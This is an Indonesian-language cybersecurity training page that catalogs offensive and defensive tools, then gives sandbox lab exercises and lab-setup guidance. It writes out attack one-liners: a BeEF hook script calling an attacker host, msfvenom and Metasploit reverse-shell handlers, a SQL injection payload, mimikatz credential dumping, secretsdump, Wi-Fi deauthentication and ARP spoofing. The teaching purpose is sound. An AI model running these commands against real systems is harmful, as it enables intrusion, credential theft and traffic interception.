Nmap standard

Scanner port & service no. 1 di industri. Mendeteksi OS, versi service, dan menjalankan script vulnerability detection.

nmap
$ nmap -sV -sC -p- --open -T4 10.10.10.5
# -sV service version, -sC default scripts, -p- semua port, -T4 lebih cepat
reconscanning

Recon-ng OSINT

Framework reconnaissance pasif modular — kumpulkan subdomain, email, dan hubungan entitas tanpa menyentuh target.

recon-ng
$ recon-ng
[recon-ng] > marketplace install all
[recon-ng] > modules load recon/domains-hosts/brute_hosts
osintrecon

Shodan internet-wide

Mesin pencari semua device yang terhubung internet. Temukan exposed service, default config, dan IoT/SCADA tanpa izin.

shodan
$ shodan search 'port:3389 country:ID' --fields ip_str,port,os
osintrecon

theHarvester / Sublist3r

Kumpulkan email, subdomain, dan aset publik untuk memetakan permukaan serangan secara cepat dari source terbuka.

theHarvester
$ theHarvester -d target.com -b all -l 500

Nessus / OpenVAS

Vulnerability scanner otomatis. Memetakan kerentanan dari versi service — front line untuk program vuln management berkala.

openvas
sudo gvm-setup && sudo gvm-start

Nikto / WPScan

Scanner kerentanan web berbasis database; WPScan khusus deteksi plugin, tema, dan user WordPress yang rentan.

wpscan
$ wpscan --url https://target/blog --enumerate u,ap,at

Burp Suite standard industri

Proxy intercept utama untuk analisis request/respons, Repeater untuk manipulasi manual, Intruder untuk fuzzing, dan Scanner otomatis. Wajib dikuasai semua pentester web.

burp workflow
# intercept -> kirim ke Repeater -> ubah param -> kirim ke IntruderGET /search.php?q=' OR 1=1-- HTTP/1.1
Host: target.local
Cookie: PHPSESSID=generated_value
proxyfuzzerscanner

OWASP ZAP open source

Alternatif gratis penuh: active & passive scanner, fuzzer, dan automation API. Sangat ramah pemula dan termasuk tools resmi OWASP.

zap
# jalankan sebagai daemon untuk otomasi CI/CD
zap.sh -daemon -port 8090 -config api.key=cyberguard123

SQLMap

Otomasi penuh SQL injection: deteksi, pemetaan database, dump data, dan bahkan OS shell pada kondisi tertentu. Memiliki pilihan teknik (boolean, time, UNION, error).

sqlmap
$ sqlmap -u 'http://target/search.php?id=1' --dbs --batch
$ sqlmap -u '.../id=1' -D dvwa -T users --dump --batch
sqliotomasi

ffuf / gobuster content discovery

Brute-force direktori, file, virtual host, dan parameter tersembunyi. ffuf sangat cepat karena menggunakan Go; gobuster lebih sederhana.

ffuf
$ ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt
       -u http://target/FUZZ -mc 200,301,302

XSSHunter / BeEF

BeEF men-hook browser korban via XSS untuk eksekusi modul: steal cookies, keylog, atau mengambil screenshot. XSSHunter memindai callback XSS otomatis.

beef hook
<script src="http://attacker:3000/hook.js"></script>

Dirsearch / feroxbuster

Enumerasi konten web yang lebih lengkap dengan dukungan recursion dan filtering status codes. feroxbuster mendukung rekursi bawaan.

feroxbuster
$ feroxbuster -u http://target -w dirs.txt --insecure -x php,html

Metasploit Framework framework

Framework exploit & post-exploitation terpopuler dengan ribuan exploit, payload, dan auxiliary module. Dari riset hingga exploitasi nyata.

msfconsole
msf6 > use exploit/multi/handler
msf6 > set payload linux/x64/shell/reverse_tcp
msf6 > set lhost 10.0.0.2  |  set lport 4444
msf6 > exploit -j

Searchsploit exploit-db local

Database exploit lokal. Cocokkan versi service hasil scanning dengan exploit yang tersedia. Jangan lupa verifikasi manual sebelum eksekusi.

searchsploit
$ searchsploit samba 4.6
$ searchsploit -m 42060  # salin exploit ke folder kerja

Hydra / Medusa

Brute-force login SSH, FTP, RDP, web form, dan lainnya. Pakai dengan wordlist yang tepat (rockyou, SecLists) dan selalu perhatikan rate-limit.

hydra
$ hydra -l admin -P rockyou.txt ssh://10.0.0.2 -t 4
brute-force

msfvenom payload generator

Generate payload/shellcode dalam berbagai format dan encoding. Wajib paham konsep reverse vs bind shell sebelum menggunakannya.

msfvenom
$ msfvenom -p linux/x64/shell/reverse_tcp \
  LHOST=10.0.0.2 LPORT=4444 -f elf -o shell.elf

Responder poisoning

Berdiam di jaringan dan menangkap kredensial via LLMNR/NBT-NS poisoning. Favorit di engagement internal Windows.

responder
$ responder -I eth0 -wPv

Cobalt Strike / Sliver C2

Command & Control untuk adversary simulation lanjut: beaconing, evasive implant, dan tiramida post-exploit. Sliver adalah open-source alternatif.

c2adversary

Mimikatz windows

Mengekstrak kredensial dari memory Windows: plaintext, NTLM hash, dan Kerberos tickets. Salah satu serangan paling berdampak di AD.

mimikatz
mimikatz # sekurlsa::logonpasswords
mimikatz # lsadump::dcsync /domain:corp.local /all

BloodHound + SharpHound

Petakan seluruh relasi Active Directory — group, sessions, ACL — dan temukan jalur tercepat dari user biasa menuju DA (Domain Admin).

bloodhound
$ bloodhound-python -d corp.local \
  -u user -p Pass123! -ns 10.0.0.5 -c All

LinPEAS / WinPEAS

Enumerasi otomatis untuk menemukan vektor privilege escalation: SUID, cron, service misconfig, token, dan file berisi kredensial.

linpeas
$ ./linpeas.sh -a | tee report.txt

Impacket Suite

Koleksi tool Python untuk protokol Windows: psexec, smbexec, wmiexec, secretsdump. Standar untuk pentest domain Windows.

impacket
$ python3 impacket-secretsdump 'corp.local/admin:Pass1!'@DC
$ python3 impacket-psexec 'corp.local/user:Pass2!'@10.0.0.15

Hashcat / John the Ripper

Password cracking: Hashcat eksploit GPU untuk kecepatan ekstrem, John fleksibel untuk CPU dan format eksotik.

hashcat
$ hashcat -m 3200 hash.txt rockyou.txt --show
$ hashcat -m 1000 ntlm.txt --rules best64

Chisel / ligolo-ng pivoting

Tunnel untuk lateral movement dan pivoting — akses segmen jaringan yang tidak bisa dijangkau langsung dari host kompromi.

ligolo
attacker: sudo ./proxy -selfcert
target : .\agent.exe -connect 10.0.0.2:11601

aircrack-ng suite

Suite lengkap audit Wi-Fi. Berpikir dalam alur: monitor mode → capture handshake → deauth client → crack PSK. Selalu gunakan hanya pada jaringan yang kamu miliki.

aircrack workflow
$ airmon-ng start wlan0
$ airodump-ng --bssid AA:BB:CC:00:11:22 -c 6 -w cap wlan0mon
$ aireplay-ng --deauth 10 -a AA:BB:CC:00:11:22 wlan0mon
$ aircrack-ng cap-01.cap -w rockyou.txt

bettercap

Framework MITM & network attack modern: ARP spoofing, DNS hijacking, dan packet sniffing dengan UI interaktif.

bettercap
sudo bettercap -iface wlan0
[bettercap] set arp.spoof.targets 10.0.0.5
[bettercap] arp.spoof on

wifite / evil twin

Otomasi audit Wi-Fi (wifite) dan rogue access point untuk uji legal. Tools ini menuntut izin penuh atas spektrum dan jaringan yang diuji.

Peringatan Legal

Menggunakan tools wireless pada jaringan milik orang lain adalah pelanggaran serius (UU Telekomunikasi & UU ITE di Indonesia). Hanya audit jaringan milikmu sendiri atau yang diizinkan tertulis.

Wireshark / tshark analisis

Analyzer paket lengkap dengan filter ekspresif. Keterampilan kunci: follow TCP stream, temukan anomali, dan ekspor artifact.

tshark
$ tshark -r capture.pcap -Y "http.request.method==POST"
$ tshark -r capture.pcap -T fields -e dns.qry.name | sort | uniq -c
pcapforensik

Suricata / Snort IDS/IPS

Deteksi intrusion berbasis signature dengan DPI. Suricata mendukung multi-threading dan parsing file; Snort klasik dan ringan.

suricata
$ suricata -r capture.pcap -l logs/ -S local.rules

Wazuh HIDS + SIEM

Agent monitoring host (file integrity, log, active response) + dashboard sentral. Open-source — pilihan utama SOC hemat biaya.

wazuh
$ /var/ossec/bin/agent-auth -m 10.0.0.5 -p 1515

Splunk / Elastic SIEM

Sentralisasi dan korelasi log. Splunk kuat & mahal; Elastic (ELK) open-source & extensible. Query adalah skill utama: SPL vs KQL.

splunk SPL
index=winlog EventCode=4625
| stats count by user, src_ip | sort -count

Sysmon + osquery telemetri

Sysmon mencatat proses, network, dan registry secara detail di Windows; osquery membiarkan kamu menanyai endpoint seperti database SQL.

osquery
SELECT name,path,pid FROM processes
WHERE name LIKE '%miner%' OR name LIKE '%crypt%';

YARA + ClamAV deteksi malware

YARA mendefinisikan pattern untuk identifikasi malware; ClamAV adalah scanner open-source untuk gateway email/file. Kombinasi khas di SMTP dan whaling.

yara
rule Ransomware_KeyWords {
  strings: $a = "encrypt"  $b = "payment"
  condition: ($a and $b) or filesize < 500KB
}

Velociraptor DFIR

Kumpulkan data forensik dari seluruh host skala besar — artifact hunting, remote collection, dan container quering semua dalam satu platform.

MISP / TheHive intel & case

MISP berbagi & mengorelasi Indicator of Compromise antar organisasi; TheHive mengelola investigasi dan dapat dipicu respons otomatis via Cortex.

Forensik Disk & Memory

Autopsy (analisis disk grafis), Volatility (memory), strings/binwalk (carving), exiftool (metadata), steghide (steganografi).

volatility
$ vol -f mem.dmp windows.pslist
$ vol -f mem.dmp windows.malfind

OSINT & Password

Sherlock (hunting username), grep.app, Google dorking, dan teknik enumerasi OSINT lain. (Lihat modul Offensive untuk sumber & etika penggunaannya.)

Praktik Langsung: Coba Tools di Sandbox

Katalog di atas berisi puluhan tools. Di sesi ini dosen mempraktikkan yang paling sering dipakai: Nmap (network), SQLMap (uji injeksi), curl (recon web), dan grep (analisis log). Semua berjalan di terminal real-time — klik Jalankan atau ketik sendiri.

1. Nmap: Host Discovery dan Versi Layanan

Nmap adalah pendamping utama penelusuran jaringan. ping memeriksa host hidup, nmap -sn melakukan host discovery, lalu nmap -sV mengungkap versi layanan — bahan dasar penilaian kerentanan.

ping 192.168.1.10 && nmap -sn 192.168.1.10 nmap -sV 192.168.1.10

2. SQLMap: Otomasi Deteksi SQL Injection

SQLMap mengotomatiskan deteksi dan eksploitasi celah injeksi SQL. Di sandbox, target http://lab-web-01/search?id=1 meniru parameter yang rentan. Alur utamanya: --dbs (daftar database), --tables (tabel), --dump (ekstrak data sebagai bukti).

sqlmap -u 'http://lab-web-01/search?id=1' --dbs sqlmap -u 'http://lab-web-01/search?id=1' --tables sqlmap -u 'http://lab-web-01/search?id=1' --dump

3. curl: Menyelidiki Response Web

curl adalah jendela pandang ke web server dari sisi HTTP. Opsi -I mengambil header saja — cara cepat menebak teknologi server dan banner versinya.

curl -I http://lab-web-01/search?id=1

4. grep dan wc: Tools Analisis Log (Sisi Blue)

Bukan hanya tools serang yang penting. Analis SOC memakai grep untuk mencari pola serangan dan wc -l untuk mengukur volumenya. Contoh di bawah menghitung percobaan login gagal di auth.log.

grep 'Failed password' /var/log/auth.log wc -l /var/log/auth.log

5. Audit Password: Bukti di Tangan Anda

Di lab ini, john dan gobuster menutup siklus: setelah menemukan path tersembunyi lewat enumerasi direktori, verifikasi hash kredensial di wordlist sandbox untuk membuktikan kelemahan tanpa menyerang aplikasi. Semua bukti dicatat dan diklaim lewat sistem flag.

gobuster dir -u http://lab-web-01 -w /opt/lab/wordlists/directory.txt
john /opt/lab/hashes.txt
cat /opt/lab/flag-web.txt && flag FLAG{lab-web-01}

Setup Lab Latihan (Legal & Aman)

Tidak ada cara belajar lebih baik daripada laboratorium sendiri. Buka panduan berikut langkah demi langkah.

L1Instal Kali Linux di Virtual Machine

1. Unduh VirtualBox/VirtualBox atau VMware. 2. Unduh Citra Kali Linux (VM image). 3. Import appliances: File → Import Appliance. 4. Alokasikan ≥ 4 GB RAM + 4 CPU. 5. Set jaringan sebagai host-only/NAT untuk isolasi. 6. Boot, jalankan sudo apt update && sudo apt full-upgrade -y. Selesai — kamu punya lab offense siap pakai.

L2Pasang Target Vuln: Metasploitable & DVWA

Target yang sengaja rentan untuk latihan legal.
Metasploitable 2: unduh image lalu import seperti VM biasa; login msfadmin/msfadmin.
DVWA: jalankan via Docker: docker run -d -p 8080:80 vulnerables/web-dvwa lalu buka http://localhost:8080.
OWASP Juice Shop: docker run -d -p 3000:3000 bkimminich/juice-shop lalu buka port 3000. Jangan pernah menghubungkan target ini ke internet publik.

L3Platform CTF Online Terpandu

TryHackMe (path belajar terstruktur, ramah pemula), HackTheBox (machine + Academy), PortSwigger Web Security Academy (lab web gratis), VulnHub (target offline), dan CyberDefenders (blue team). Semua legal dan aman karena di dalam lingkungan penyelenggara.
